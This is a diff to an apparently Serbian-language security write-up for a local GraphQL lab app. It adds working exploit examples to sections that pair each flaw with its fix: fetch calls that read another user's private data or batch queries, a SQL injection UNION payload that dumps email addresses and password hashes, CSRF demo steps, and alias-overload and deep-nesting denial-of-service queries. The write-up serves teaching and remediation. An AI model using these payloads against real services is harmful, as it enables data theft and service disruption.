@@ -85,6 +85,9 @@ Svi exploit-i ispod se šalju na `POST http://localhost:8089/graphql` sa `Conten
   Vraća Bob-ov email, njegove draft-ove i svaku DM poruku u kojoj učestvuje.
 - **Ispravka:** svako polje poredi `$context['userId']` sa traženim `$user['id']` i vraća `null` / praznu listu za korisnike koji nisu vlasnici.
 
+Test primer: 
+fetch('http://localhost:8089/graphql',{method:'POST', credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:'{ user(id:2){ email drafts{title body} messages{body} }}'})}).then(r=>r.json()).then(console.log)
+
 ### 2. SQL injekcija — `searchPosts(keyword)`
 
 - **Gde:** `backend/src/GraphQL/Schema.php`, `searchPosts` resolver.
@@ -95,6 +98,10 @@ Svi exploit-i ispod se šalju na `POST http://localhost:8089/graphql` sa `Conten
   ```
   Izvlači tabelu `users` — email-ovi u `title`, bcrypt hešovi u `body`.
 - **Ispravka:** pripremljeni upit (prepared statement) sa `?` placeholder-ima; `'%' . $keyword . '%'` se vezuje (bind), a ne interpolira.
+
+Primer u search polje:
+%') UNION SELECT 1, 1, email, password_hash,
+  'published', NOW() FROM users #
 
 ### 3. CSRF na mutacijama
 
@@ -110,6 +117,10 @@ Svi exploit-i ispod se šalju na `POST http://localhost:8089/graphql` sa `Conten
   Žrtva poseti stranicu dok je prijavljena, klikne, i post se kreira kao ona.
 - **Ispravka:** `/graphql` prihvata samo `application/json` i zahteva `X-CSRF-Token` header po sesiji. Token se izdaje pri prijavi i izlaže preko `/auth/me`. Prilagođeni header-i prisiljavaju CORS preflight, koji napadačeva stranica ne može da prođe.
 
+Primer:
+1. pozicionirati se u csrf-demo folder i pokrenuti i otvoriti u browser-u
+2. Kliknuti na Preuzmi nagradu
+3. Vratiti se na prvobitnu stranicu videce se post koji je kreiran u ime ulogovanog korisnika
 ### 4. Grupisanje upita (batching)
 
 - **Gde:** `backend/public/index.php`, `/graphql` handler.
@@ -121,12 +132,17 @@ Svi exploit-i ispod se šalju na `POST http://localhost:8089/graphql` sa `Conten
   Dve operacije, jedan zahtev.
 - **Ispravka:** odbijanje niza kao tela zahteva sa HTTP 400 — jedna operacija po zahtevu.
 
+Primer: 
+fetch('http://localhost:8089/graphql',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify([{query:'{ posts { id title }}'},{query:'{ user(id:2){ email } }'},{query:'{user(id:3){ email }}'}])}).then(r=>r.json()).then(console.log)
+
 ### 5. Preopterećenje alias-ima (alias overload)
 
 - **Greška:** isto skupo polje moglo je da se traži stotine puta u jednom upitu preko alias-a (`a1: ... a2: ... ... a200: ...`), pojačavajući svaki trošak po pozivu.
 - **Exploit:** `{ a1: posts { id } a2: posts { id } ... a200: posts { id } }`.
 - **Ispravka:** prilagođeno `MaxAliasesRule` (`backend/src/GraphQL/MaxAliasesRule.php`) ograničeno na 15 i registrovano preko `DocumentValidator::addRule`.
 
+Primer: 
+const q='{ '+Array.from({length:200},(_,i)=>`a${i}:posts { id }`).join(' ')+' }'; fetch('http://localhost:8089/graphql',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:q})}).then(r=>r.json()).then(d=>console.log('izvrseno alias-a:',Object.keys(d.data||{}).length, d))
 ### 6. Neograničena dubina i složenost upita
 
 - **Greška:** napadač je mogao da rekurzira duboko (`post → comments → author → posts → comments → ...`) ili da traži mnoštvo polja.
@@ -135,7 +151,8 @@ Svi exploit-i ispod se šalju na `POST http://localhost:8089/graphql` sa `Conten
   { post(id:1) { comments { author { posts { comments { author { posts { id } } } } } } } }
   ```
 - **Ispravka:** pravila `QueryDepth(7)` i `QueryComplexity(150)` dodata u `index.php`.
-
+Primer:
+let inner='id'; for(let i=0;i<10;i++){inner=`comments { author { drafts { ${inner} } } }`;} const q=`{ post(id:1) { ${inner} } }`; fetch('http://localhost:8089/graphql',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:q})}).then(r=>r.json()).then(d=>console.log(d))
 ### 7. Curenje informacija — introspekcija, trace-ovi i predlozi polja
 
 - **Gde:** `backend/public/index.php`, `executeQuery` debug + podrazumevani formatter grešaka.
